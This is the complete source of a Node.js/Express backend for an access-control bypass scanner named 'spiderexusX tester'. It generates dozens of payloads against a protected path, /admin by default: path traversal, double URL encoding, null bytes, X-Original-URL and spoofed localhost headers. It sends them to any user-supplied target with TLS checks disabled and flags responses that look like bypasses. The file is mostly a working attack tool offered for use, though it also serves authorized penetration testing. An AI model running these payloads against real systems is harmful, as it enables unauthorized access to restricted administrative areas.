/* =========================================================
   🕷️ spiderexusX tester — BACKEND
   Real HTTP request engine using axios
   ========================================================= */
const express = require('express');
const axios = require('axios');
const https = require('https');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '5mb' }));
app.use(express.static(path.join(__dirname, 'public')));

/* ---------- axios instance (ignore SSL for lab targets) ---------- */
const httpAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });

const client = axios.create({
  timeout: 15000,
  maxRedirects: 5,
  validateStatus: () => true,
  httpsAgent: httpAgent,
  headers: {
    'User-Agent': 'spiderexusX-tester/1.0',
  },
});

/* =========================================================
   BYPASS PAYLOAD GENERATOR
   ========================================================= */
function generateBypassPayloads(targetPath) {
  const clean = targetPath.replace(/^\/+|\/+$/g, '');
  const payloads = [];

  // ---- 1. Case manipulation ----
  payloads.push({ name: 'Case Upper',        path: '/' + clean.toUpperCase() });
  payloads.push({ name: 'Case Lower',        path: '/' + clean.toLowerCase() });
  payloads.push({ name: 'Case Alternating',  path: '/' + clean.split('').map((c,i) =>
    i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('') });

  // ---- 2. Path traversal ----
  payloads.push({ name: 'Traversal ../',       path: '/' + clean + '/../' + clean });
  payloads.push({ name: 'Traversal ..;/',      path: '/' + clean + '/..;/' + clean });
  payloads.push({ name: 'Traversal %2e%2e',    path: '/%2e%2e/' + clean });
  payloads.push({ name: 'Traversal %252e',     path: '/%252e%252e/' + clean });
  payloads.push({ name: 'Multi ..%2f',         path: '/..%2f..%2f' + clean });

  // ---- 3. URL encoding ----
  payloads.push({ name: 'URL Encode Single', path: '/' + clean.slice(0,15).replace(/[a-z]/g,
    c => '%' + c.charCodeAt(0).toString(16)) });
  payloads.push({ name: 'URL Encode Double', path: '/' + clean.slice(0,15).replace(/[a-z]/g,
    c => '%25' + c.charCodeAt(0).toString(16)) });

  // ---- 4. Null byte & special chars ----
  payloads.push({ name: 'Null Byte %00',   path: '/' + clean + '%00' });
  payloads.push({ name: 'Null Byte %00/',  path: '/' + clean + '%00/' });
  payloads.push({ name: 'Semicolon ;/',    path: '/' + clean + ';/' });
  payloads.push({ name: 'Trailing Dot',    path: '/' + clean + '/.' });
  payloads.push({ name: 'Trailing Dot 2',  path: '/' + clean + '..' });
  payloads.push({ name: 'Double Slash',    path: '//' + clean + '//' });
  payloads.push({ name: 'Triple Slash',    path: '///' + clean + '///' });

  // ---- 5. Extensions ----
  payloads.push({ name: 'JSON ext',       path: '/' + clean + '.json' });
  payloads.push({ name: 'HTML ext',       path: '/' + clean + '.html' });
  payloads.push({ name: 'PHP ext',        path: '/' + clean + '.php' });
  payloads.push({ name: 'ASP ext',        path: '/' + clean + '.asp' });
  payloads.push({ name: 'Trailing Slash', path: '/' + clean + '/' });
  payloads.push({ name: 'Trailing Slashx', path: '/' + clean + '/' + clean + '/' });

  // ---- 6. Header-based bypasses ----
  payloads.push({ name: 'X-Original-URL',   path: '/', headers: { 'X-Original-URL': '/' + clean } });
  payloads.push({ name: 'X-Rewrite-URL',    path: '/', headers: { 'X-Rewrite-URL': '/' + clean } });
  payloads.push({ name: 'X-Forwarded-For',  path: '/' + clean, headers: { 'X-Forwarded-For': '127.0.0.1' } });
  payloads.push({ name: 'X-Remote-IP',      path: '/' + clean, headers: { 'X-Remote-IP': '127.0.0.1' } });
  payloads.push({ name: 'X-Client-IP',      path: '/' + clean, headers: { 'X-Client-IP': '127.0.0.1' } });
  payloads.push({ name: 'X-Host: localhost', path: '/' + clean, headers: { 'X-Host': 'localhost' } });
  payloads.push({ name: 'X-Forwarded-Host', path: '/' + clean, headers: { 'X-Forwarded-Host': 'localhost' } });

  // ---- 7. Whitespace ----
  payloads.push({ name: 'Tab %09',         path: '/' + clean + '%09' });
  payloads.push({ name: 'Space %20',       path: '/' + clean + '%20' });
  payloads.push({ name: 'Plus sign',       path: '/' + clean + '+' });
  payloads.push({ name: 'Newline %0a',     path: '/' + clean + '%0a' });
  payloads.push({ name: 'CR %0d',          path: '/' + clean + '%0d' });

  // ---- 8. Duplicate slash variations ----
  payloads.push({ name: 'Prefix space',    path: '/ ' + clean });
  payloads.push({ name: 'Suffix space',    path: '/' + clean + ' ' });
  payloads.push({ name: 'Uppercase ext',   path: '/' + clean.toUpperCase() + '.JSON' });

  return payloads;
}

function buildUrl(baseUrl, pathStr) {
  const base = baseUrl.replace(/\/+$/, '');
  const p = pathStr.startsWith('/') ? pathStr : '/' + pathStr;
  return base + p;
}

/* =========================================================
   POST /api/request — Single request test
   ========================================================= */
app.post('/api/request', async (req, res) => {
  const { url, method = 'GET', headers = {}, body = null } = req.body;
  if (!url) return res.status(400).json({ error: 'url is required' });

  const t0 = Date.now();
  try {
    const response = await client({
      method: method.toUpperCase(),
      url,
      headers,
      data: body,
    });

    const ms = Date.now() - t0;
    const bodyText = typeof response.data === 'string'
      ? response.data
      : JSON.stringify(response.data);

    res.json({
      ok: true,
      status: response.status,
      statusText: response.statusText,
      headers: response.headers,
      bodyPreview: bodyText.slice(0, 5000),
      bodyLength: bodyText.length,
      ms,
    });
  } catch (err) {
    res.json({
      ok: false,
      error: err.code || err.message,
      ms: Date.now() - t0,
    });
  }
});

/* =========================================================
   POST /api/baseline — Get baseline status of target path
   ========================================================= */
app.post('/api/baseline', async (req, res) => {
  const { baseUrl, targetPath = '/admin', method = 'GET', headers = {} } = req.body;
  if (!baseUrl) return res.status(400).json({ error: 'baseUrl is required' });

  const finalUrl = buildUrl(baseUrl, targetPath);
  const t0 = Date.now();

  try {
    const response = await client({ method: method.toUpperCase(), url: finalUrl, headers });
    const bodyText = typeof response.data === 'string'
      ? response.data
      : JSON.stringify(response.data);

    res.json({
      ok: true,
      url: finalUrl,
      status: response.status,
      statusText: response.statusText,
      length: bodyText.length,
      bodyPreview: bodyText.slice(0, 2000),
      ms: Date.now() - t0,
    });
  } catch (err) {
    res.json({
      ok: false,
      url: finalUrl,
      error: err.code || err.message,
      ms: Date.now() - t0,
    });
  }
});

/* =========================================================
   POST /api/scan — Batch bypass scan (the main event)
   ========================================================= */
app.post('/api/scan', async (req, res) => {
  const {
    baseUrl,
    targetPath = '/admin',
    method = 'GET',
    headers = {},
    baselineStatus = 403,
    baselineLength = 0,
    delay = 50,
  } = req.body;

  if (!baseUrl) return res.status(400).json({ error: 'baseUrl is required' });

  const payloads = generateBypassPayloads(targetPath);
  const results = [];

  for (const p of payloads) {
    const finalUrl = buildUrl(baseUrl, p.path);
    const mergedHeaders = { ...headers, ...(p.headers || {}) };
    const t0 = Date.now();

    try {
      const response = await client({
        method: method.toUpperCase(),
        url: finalUrl,
        headers: mergedHeaders,
      });

      const ms = Date.now() - t0;
      const bodyText = typeof response.data === 'string'
        ? response.data
        : JSON.stringify(response.data);
      const len = bodyText.length;

      // ---------- VERDICT LOGIC (real analysis) ----------
      let verdict = 'blocked';
      const status = response.status;

      // 2xx = definitely accessible
      if (status >= 200 && status < 300) verdict = 'pass';
      // 3xx = redirect (could be interesting)
      else if (status >= 300 && status < 400) verdict = 'redirect';

      // Bypass detection: status changed from baseline in a good way
      if (baselineStatus >= 400 && status >= 200 && status < 300) {
        verdict = 'bypass'; // baseline forbidden → now OK
      } else if (baselineStatus >= 400 && status >= 300 && status < 400 &&
                 response.headers.location && !response.headers.location.includes('login')) {
        verdict = 'bypass'; // redirect away from auth is bypass
      } else if (status === baselineStatus && len !== baselineLength &&
                 Math.abs(len - baselineLength) > 100) {
        verdict = 'diff'; // same status but different body → possible info leak
      }

      // Body-based heuristic: if response includes admin panel keywords
      const bodyLower = bodyText.toLowerCase();
      if (status >= 200 && status < 300 &&
          (bodyLower.includes('admin panel') ||
           bodyLower.includes('dashboard') ||
           bodyLower.includes('welcome back'))) {
        verdict = 'bypass';
      }

      results.push({
        name: p.name,
        path: p.path,
        url: finalUrl,
        method: method.toUpperCase(),
        status,
        length: len,
        ms,
        verdict,
        extraHeaders: p.headers || null,
        location: response.headers.location || null,
        bodyPreview: bodyText.slice(0, 400),
      });
    } catch (err) {
      results.push({
        name: p.name,
        path: p.path,
        url: finalUrl,
        method: method.toUpperCase(),
        status: 0,
        length: 0,
        ms: Date.now() - t0,
        verdict: 'error',
        error: err.code || err.message,
      });
    }

    if (delay > 0) await new Promise(r => setTimeout(r, delay));
  }

  const summary = {
    total:     results.length,
    passed:    results.filter(r => r.verdict === 'pass').length,
    bypassed:  results.filter(r => r.verdict === 'bypass').length,
    redirect:  results.filter(r => r.verdict === 'redirect').length,
    blocked:   results.filter(r => r.verdict === 'blocked').length,
    diff:      results.filter(r => r.verdict === 'diff').length,
    errors:    results.filter(r => r.verdict === 'error').length,
  };

  res.json({
    ok: true,
    target: buildUrl(baseUrl, targetPath),
    baselineStatus,
    results,
    summary,
    finishedAt: Date.now(),
  });
});

/* ---------- Health check ---------- */
app.get('/api/health', (req, res) => {
  res.json({ ok: true, name: 'spiderexusX tester', ts: Date.now() });
});

app.listen(PORT, () => {
  console.log('\n  ╔══════════════════════════════════════════════╗');
  console.log('  ║   🕷️  spiderexusX tester — RUNNING          ║');
  console.log('  ╠══════════════════════════════════════════════╣');
  console.log(`  ║   ➜  http://localhost:${PORT}                  ║`);
  console.log('  ╚══════════════════════════════════════════════╝\n');
});